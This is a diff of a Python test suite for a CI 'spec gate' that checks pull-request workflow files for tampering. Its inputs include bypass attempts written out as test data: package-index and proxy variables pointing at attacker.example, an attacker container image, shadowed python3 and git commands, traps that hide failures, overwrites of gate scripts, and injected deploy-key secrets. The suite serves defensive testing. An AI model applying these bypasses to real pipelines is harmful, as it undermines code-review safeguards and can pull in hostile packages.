+                 "          sparse-checkout: |\n            scripts/gate/spec_gate.py\n            scripts/gate/export_model_registry.py\n"
+                 "          sparse-checkout-cone-mode: false\n")
+    suite = suite_workflow()
+    assert suite.count(head_step) == 1
+    for broken in (suite.replace(head_step, ""),
+                   suite.replace("            scripts/gate/spec_gate.py\n            scripts/gate/export", "            scripts/gate/export", 1),
+                   suite.replace(head, "          ref: ${{ github.event.pull_request.base.sha }}\n", 1),
+                   suite.replace("          path: proposed-head\n", "          path: elsewhere\n", 1),
+                   suite.replace(head_step, head_step.replace("      - uses:", "      - if: false\n        uses:", 1)),
+                   suite.replace(head_step, "").replace("    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n",
+                                                        "    steps:\n" + head_step + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n", 1)):
+        assert broken != suite
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: broken, wf: typed}, **cap)
         assert r.returncode == 1 and ("no longer reaches the suite's job" in r.stdout or "uploaded or downloaded more than once" in r.stdout), (broken, r.stdout)
     # where the exporter exists, its proposed copy is exported and the base's exporter suite runs, isolated
     exporter = {"scripts/gate/export_model_registry.py": "print('x')\n"}
-    r = pr(repo, "chore/gate-workflow", {wf: typed, **exporter}, **cap)
+    export_suite = "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q -p no:cacheprovider --noconftest"
+    assert suite.count(export_suite) == 1
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite.replace(export_suite, ""), wf: typed, **exporter}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout and "export_model_registry" in r.stdout, r.stdout
-    export_both = EXPORT_CMD + "\n          git show \"$HEAD_SHA:scripts/gate/export_model_registry.py\" > \"$RUNNER_TEMP/proposed/export_model_registry.py\""
-    both_suites = SUITE_CMD + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q"
-    with_exporter = gate_workflow(b="|\n          " + export_both, c="|\n          " + both_suites)
-    assert pr(repo, "chore/gate-workflow", {wf: with_exporter, **exporter}, **cap).returncode == 0
-    misplaced = gate_workflow(b="|\n          " + export_both + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q")
-    r = pr(repo, "chore/gate-workflow", {wf: misplaced, **exporter}, **cap)
+    with_exporter = gate_pair()
+    assert pr(repo, "chore/gate-workflow", {**with_exporter, **exporter}, **cap).returncode == 0
+    misplaced = suite.replace("          python3 scripts/gate/export_model_registry.py --check",
+                              "          python3 -m pytest tests/scripts/test_export_model_registry.py -q\n          python3 scripts/gate/export_model_registry.py --check", 1)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: misplaced, wf: typed, **exporter}, **cap)
     assert r.returncode == 1 and ("does not follow" in r.stdout or "holds no checkout credentials" in r.stdout), r.stdout
     # the hook's mode is read from the head tree
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
@@ -3265,10 +3353,10 @@ def test_quoted_text_is_text_across_lines(repo):
                   '|\n          echo "disabled; ' + VERDICT_CMD + '"',
                   "|\n          echo 'disabled;\n          " + VERDICT_CMD + "\n          '",
                   '|\n          x="\n          ' + VERDICT_CMD + '\n          "'):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=decoy)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=decoy)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (decoy, r.stdout)
     quoted_args = gate_workflow(a='|\n          echo "note: $HEAD_SHA"\n          ' + VERDICT_CMD + '\n          echo "done"')
-    assert pr(repo, "chore/gate-workflow", {wf: quoted_args}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: quoted_args}, **cap).returncode == 0
 
 
 def test_startup_environment_substitutions_nested_runs_paths_and_checkouts_are_the_contract(repo):
@@ -3283,30 +3371,32 @@ def test_startup_environment_substitutions_nested_runs_paths_and_checkouts_are_t
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     for env_block in (typed.replace("      - env:\n", "      - env:\n          PYTEST_ADDOPTS: --collect-only\n", 1),
                       typed.replace("      - env:\n", "      - env:\n          BASH_ENV: scripts/gate/skip.sh\n", 1),
                       typed.replace("permissions:\n", "env:\n  PYTHONPATH: scripts/gate/shim\npermissions:\n", 1),
                       typed.replace("  gate:\n", "  gate:\n    env: { PATH: 'scripts/gate/bin:/usr/bin' }\n", 1),
                       typed.replace("      - run: git fetch", "      - run: echo \"scripts/gate/bin\" >> \"$GITHUB_PATH\"\n      - run: git fetch", 1)):
-        r = pr(repo, "chore/gate-workflow", {wf: env_block}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: env_block}, **cap)
         assert r.returncode == 1 and ("in an `env:` block" in r.stdout or "assigns or unsets" in r.stdout), (env_block, r.stdout)
     for subst in ('echo "$(' + VERDICT_CMD + ')"', 'printf "%s" "$(' + VERDICT_CMD + ')"', 'true $(' + VERDICT_CMD + ')'):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=subst)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=subst)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (subst, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a='|\n          out=$(' + VERDICT_CMD + ' 2>&1) && rc=0 || rc=$?\n          printf "%s\\n" "$out"\n          exit "$rc"')}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a='|\n          out=$(' + VERDICT_CMD + ' 2>&1) && rc=0 || rc=$?\n          printf "%s\\n" "$out"\n          exit "$rc"')}, **cap).returncode == 0
     nested = typed.replace("        run: " + VERDICT_CMD + "\n", "          run: " + VERDICT_CMD + "\n        run: 'true'\n")
-    r = pr(repo, "chore/gate-workflow", {wf: nested}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: nested}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
-    other_dir = typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: ${{ runner.temp }}/not-proposed/\n")
-    r = pr(repo, "chore/gate-workflow", {wf: other_dir}, **cap)
+    head_dir = "          path: proposed-head\n          persist-credentials: false\n"
+    assert suite_workflow().count(head_dir) == 1
+    other_dir = suite_workflow().replace(head_dir, "          path: not-proposed-head\n          persist-credentials: false\n")
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: other_dir, wf: typed}, **cap)
     assert r.returncode == 1 and "no longer reaches the suite's job" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: $RUNNER_TEMP/proposed\n")}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace(head_dir, "          persist-credentials: false\n          path: proposed-head\n"), wf: typed}, **cap).returncode == 0
     checkout = "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n"
     for broken in (typed.replace(checkout, "      - if: false\n        uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n", 1),
                    typed.replace(checkout + "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n",
                                  "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n" + checkout, 1)):
-        r = pr(repo, "chore/gate-workflow", {wf: broken}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: broken}, **cap)
         assert r.returncode == 1 and "without an actions/checkout step that is unconditional and before them" in r.stdout, (broken, r.stdout)
 
 
@@ -3322,18 +3412,18 @@ def test_workflow_identity_shadowed_executables_stray_modules_and_parsed_permiss
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("name: spec-gate\n", "name: gate-v2\n", 1)}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("name: spec-gate\n", "name: gate-v2\n", 1)}, **cap)
     assert r.returncode == 1 and "no longer named `spec-gate`" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("name: spec-gate\n", "", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("name: spec-gate\n", "", 1)}, **cap)
     assert r.returncode == 1 and "no longer named `spec-gate`" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n", "  verdict:\n", 1).replace("needs: gate", "needs: verdict")}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("  gate:\n", "  verdict:\n", 1).replace("needs: gate", "needs: verdict")}, **cap)
     assert r.returncode == 1 and "keeps its job name" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  suite:\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace("  base-suite:\n", "  suite:\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and "keeps its job name" in r.stdout, r.stdout
     for shadow in ("python3() { echo \"spec gate ok\"; }\n          " + VERDICT_CMD, "function git { :; }\n          " + VERDICT_CMD,
                    "alias python3=true\n          " + VERDICT_CMD):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + shadow)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + shadow)}, **cap)
         assert r.returncode == 1 and "as a shell function or alias" in r.stdout, (shadow, r.stdout)
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
     r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3() { :; }\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
@@ -3342,10 +3432,10 @@ def test_workflow_identity_shadowed_executables_stray_modules_and_parsed_permiss
     assert r.returncode == 1 and "scripts/gate/ holds" in r.stdout, r.stdout
     assert pr(repo, "chore/gate-exporter", {"scripts/gate/export_model_registry.py": "print('x')\n"}, **cap).returncode == 0   # the exporter is not stray
     scalar = typed.replace("permissions:\n  contents: read\n", "run-name: |\n  permissions:\n    contents: read\n", 1)
-    r = pr(repo, "chore/gate-workflow", {wf: scalar}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: scalar}, **cap)
     assert r.returncode == 1 and "no top-level `permissions:` mapping" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n  contents: read\n", "permissions: { contents: read }\n", 1)}, **cap).returncode == 0
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n  contents: read\n", "permissions: read-all\n", 1)}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("permissions:\n  contents: read\n", "permissions: { contents: read }\n", 1)}, **cap).returncode == 0
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("permissions:\n  contents: read\n", "permissions: read-all\n", 1)}, **cap)
     assert r.returncode == 1 and "no top-level `permissions:` mapping" in r.stdout, r.stdout
 
 
@@ -3365,15 +3455,16 @@ def test_traps_execs_secrets_repositories_quoted_keys_and_the_exporter_suite_are
     typed = gate_workflow()
     for shape in ("|\n          trap 'exit 0' ERR\n          " + VERDICT_CMD, "|\n          exec true\n          " + VERDICT_CMD,
                   "|\n          exec echo done\n          " + VERDICT_CMD):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=shape)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          exec 2>&1\n          " + VERDICT_CMD)}, **cap).returncode == 0
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="exec " + VERDICT_CMD)}, **cap).returncode == 0
-    for secret in (typed.replace("  base-suite:\n", "  base-suite:\n    env:\n      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n", 1),
-                   typed.replace("      - env:\n", "      - env:\n          TOKEN: ${{ github.token }}\n", 1)):
-        r = pr(repo, "chore/gate-workflow", {wf: secret}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          exec 2>&1\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="exec " + VERDICT_CMD)}, **cap).returncode == 0
+    # (moved layout: the suite job is registry-check.yml's base-suite)
+    for secret in ({REGISTRY_CHECK: suite_workflow().replace("  base-suite:\n", "  base-suite:\n    env:\n      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n", 1), wf: typed},
+                   {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - env:\n", "      - env:\n          TOKEN: ${{ github.token }}\n", 1)}):
+        r = pr(repo, "chore/gate-workflow", secret, **cap)
         assert r.returncode == 1 and "reads a secret or the token" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - env:\n          \"PYTEST_ADDOPTS\": --collect-only\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - env:\n", "      - env:\n          \"PYTEST_ADDOPTS\": --collect-only\n", 1)}, **cap)
     assert r.returncode == 1 and ("in an `env:` block" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
     rc = ".github/workflows/registry-check.yml"
     head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
@@ -3411,15 +3502,15 @@ def test_trigger_filters_yaml_validity_catalog_columns_and_quoted_permissions(re
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
     for filt in ("    paths: [never/**]\n", "    paths-ignore:\n      - '**'\n", "    branches: [nothing]\n"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("    types: [opened, synchronize, reopened, edited, ready_for_review]\n",
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("    types: [opened, synchronize, reopened, edited, ready_for_review]\n",
                                                              "    types: [opened, synchronize, reopened, edited, ready_for_review]\n" + filt, 1)}, **cap)
         assert r.returncode == 1 and "filter; the gate's workflows run for every pull request" in r.stdout, (filt, r.stdout)
-    r = pr(repo, "chore/gate-workflow", {wf: typed + "broken: [\n"}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed + "broken: [\n"}, **cap)
     assert r.returncode == 1 and "is not valid YAML" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  base-suite:\n    \"permissions\": write-all\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace("  base-suite:\n", "  base-suite:\n    \"permissions\": write-all\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and ("grants a write permission" in r.stdout or "duplicate key" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
-                                                         "  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      'contents': write\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace("  base-suite:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: read\n",
+                                                         "  base-suite:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      'contents': write\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and ("grants a write permission" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
     r = pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT.replace("| Status |", "| State |", 1)})
     assert r.returncode == 1 and "no longer carries the Status field(s) the close-out reads" in r.stdout, r.stdout
@@ -3445,17 +3536,17 @@ def test_gate_files_stay_read_only_runners_suites_and_supersedes_are_the_contrac
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     for pre in ("printf 'print(\"spec gate ok\")' > scripts/gate/spec_gate.py", "cp /tmp/x scripts/gate/spec_gate.py",
                 "sed -i 's/x/y/' tests/scripts/test_spec_gate.py", "git checkout origin/x -- scripts/gate", "python3 -c 'open(\"scripts/gate/spec_gate.py\",\"w\")'"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "runs inline code" in r.stdout), (pre, r.stdout)
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - run: git fetch", "      - uses: some/action@v1\n      - run: git fetch", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - run: git fetch", "      - uses: some/action@v1\n      - run: git fetch", 1)}, **cap)
     assert r.returncode == 1 and ("runs before the verdict" in r.stdout or "use only actions/checkout" in r.stdout), r.stdout
     for runner in ("windows-latest", "macos-latest"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", f"  gate:\n    runs-on: {runner}\n", 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", f"  gate:\n    runs-on: {runner}\n", 1)}, **cap)
         assert r.returncode == 1 and "run on ubuntu-*" in r.stdout, (runner, r.stdout)
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n", 1)}, **cap)
     assert r.returncode == 1 and "no declared runner" in r.stdout, r.stdout
     suite_text = "def test_a():\n    assert f(1)\n"
     on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
@@ -3488,9 +3579,9 @@ def test_workflows_are_plain_block_yaml_without_duplicate_keys(repo):
                      (typed + "jobs: {}\n", "duplicate key"),
                      (typed.replace("permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n", 1), "anchor, alias, merge key or tag"),
                      (typed.replace("  gate:\n", "  gate:\n\truns-on: ubuntu-latest\n", 1), "is not valid YAML")):
-        r = pr(repo, "chore/gate-workflow", {wf: bad}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: bad}, **cap)
         assert r.returncode == 1 and why in r.stdout, (bad[:80], r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
 
 
 def test_sentinels_and_grouped_set_or_trap_do_not_hide_a_failure(repo):
@@ -3507,7 +3598,7 @@ def test_sentinels_and_grouped_set_or_trap_do_not_hide_a_failure(repo):
                   "|\n          { trap 'exit 0' ERR; }\n          " + VERDICT_CMD,
                   "|\n          true && set +e\n          " + VERDICT_CMD + "\n          true",
                   "|\n          if true; then set -e; fi\n          set +e\n          " + VERDICT_CMD + "\n          true"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=shape)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
     on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
     r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/usr/bin/env bash\nset -e\n{ trap 'exit 0' ERR; }\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
@@ -3525,29 +3616,29 @@ def test_contract_jobs_keep_their_context_and_runner(repo):
     typed = gate_workflow()
     for extra in ("    name: gate-x\n", "    strategy:\n      matrix:\n        shard: [1, 2]\n", "    container: ghcr.io/attacker/img:latest\n",
                   "    services:\n      db:\n        image: postgres\n", "    environment: production\n"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap)
         assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, (extra, r.stdout)
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  base-suite:\n    name: bs-x\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace("  base-suite:\n", "  base-suite:\n    name: bs-x\n", 1), wf: typed}, **cap)
     assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, r.stdout
     for env_name in ("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "NODE_OPTIONS", "UV_INDEX_URL", "HTTPS_PROXY", "https_proxy",
                      "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "RUNNER_TEMP", "GITHUB_ENV", "TMPDIR", "NODE_PATH"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n", f"env:\n  {env_name}: https://attacker.example/simple/\npermissions:\n", 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("permissions:\n", f"env:\n  {env_name}: https://attacker.example/simple/\npermissions:\n", 1)}, **cap)
         assert r.returncode == 1 and "in an `env:` block" in r.stdout, (env_name, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     # red-team round three: a blank or whitespace-only line after `jobs:` emptied the job list, so `container:`,
     # the runner and every other job-level check were skipped; YAML reads the file exactly as without it
     for gap in ("\n", "   \n"):
         spaced = typed.replace("jobs:\n", "jobs:\n" + gap, 1)
-        assert pr(repo, "chore/gate-workflow", {wf: spaced}, **cap).returncode == 0, "a blank line under jobs: is the same file"
-        r = pr(repo, "chore/gate-workflow", {wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    container: ghcr.io/attacker/img:latest\n", 1)}, **cap)
+        assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: spaced}, **cap).returncode == 0, "a blank line under jobs: is the same file"
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    container: ghcr.io/attacker/img:latest\n", 1)}, **cap)
         assert r.returncode == 1 and "declares `container`" in r.stdout, r.stdout
-        r = pr(repo, "chore/gate-workflow", {wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: self-hosted\n", 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: self-hosted\n", 1)}, **cap)
         assert r.returncode == 1 and "runs on self-hosted" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("on:\n  pull_request_target:\n", "on:\n\n  pull_request_target:\n", 1)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("on:\n  pull_request_target:\n", "on:\n\n  pull_request_target:\n", 1)}, **cap).returncode == 0
     for extra in ("    defaults:\n      run:\n        working-directory: sub\n",):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap)
         assert r.returncode == 1 and "declares `defaults`" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - working-directory: sub\n        env:\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - env:\n", "      - working-directory: sub\n        env:\n", 1)}, **cap)
     assert r.returncode == 1 and "sets `working-directory`" in r.stdout, r.stdout
 
 
@@ -3564,37 +3655,37 @@ def test_dash_line_steps_indirect_writes_and_early_returns_are_refused(repo):
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
     dashed = typed.replace("      - env:\n", "      -\n        env:\n", 1)
-    assert pr(repo, "chore/gate-workflow", {wf: dashed}, **cap).returncode == 0, "a dash on its own line is the same step"
-    r = pr(repo, "chore/gate-workflow", {wf: dashed.replace("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", "          PR_NUMBER: ''\n", 1)}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: dashed}, **cap).returncode == 0, "a dash on its own line is the same step"
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: dashed.replace("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", "          PR_NUMBER: ''\n", 1)}, **cap)
     assert r.returncode == 1 and "no longer binds PR_NUMBER" in r.stdout, r.stdout
     for pre in ("gate=scripts/gate/spec_gate.py\n          printf 'x' > \"$gate\"", "d=scripts/gate\n          cp /tmp/x \"$d/spec_gate.py\"", "t=tests/scripts/test_spec_gate.py; echo > $t"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          echo x > \"$RUNNER_TEMP/note\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          echo x > \"$RUNNER_TEMP/note\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
     # red-team round three: `>|` clobbers, `rsync` copies without a redirect, `${RUNNER_TEMP}/../..` climbs out of
     # the temp directory, an archive extractor or `python3 -m zipfile` replaces a gate file without naming it
     for pre in ("printf 'x' >| scripts/gate/spec_gate.py", "gate=scripts/gate/spec_gate.py; printf 'x' >| \"$gate\"",
                 "printf 'x' >|/usr/local/bin/python3", "rsync \"$RUNNER_TEMP/ng.py\" scripts/gate/spec_gate.py",
                 "rsync \"$RUNNER_TEMP/ng.py\" /usr/local/bin/python3", "D=scripts/gate; printf 'x' > \"${RUNNER_TEMP}/../../${D}/spec_gate.py\"",
                 "python3 -m pip install --target scripts/gate yaml"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
